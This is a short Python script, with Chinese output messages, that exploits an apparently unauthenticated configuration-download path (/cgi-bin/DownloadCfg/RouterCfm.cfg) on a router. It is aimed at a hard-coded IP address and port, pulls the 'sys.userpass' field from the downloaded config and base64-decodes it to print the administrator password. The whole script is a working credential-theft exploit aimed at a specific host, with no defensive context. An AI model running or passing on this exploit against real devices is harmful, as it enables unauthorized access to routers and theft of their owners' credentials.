import requests
import re
import base64

url = "http://180.126.175.184:8888/"
payload = "/cgi-bin/DownloadCfg/RouterCfm.cfg"

r1 = requests.get(url)
print("目标",url,"响应:",r1.status_code)
print(">" * 50)
r2 = requests.get(url+payload)
if 'sys.userpass' in r2.text:
    print(url,"存在密码泄露")
    text=r2.text
    obj = re.compile(r"sys.userpass=(?P<pass>.*)")
    base = obj.search(text).group("pass")
    print("密码：",base64.b64decode(base))
else:
    print("不存在密码泄漏")

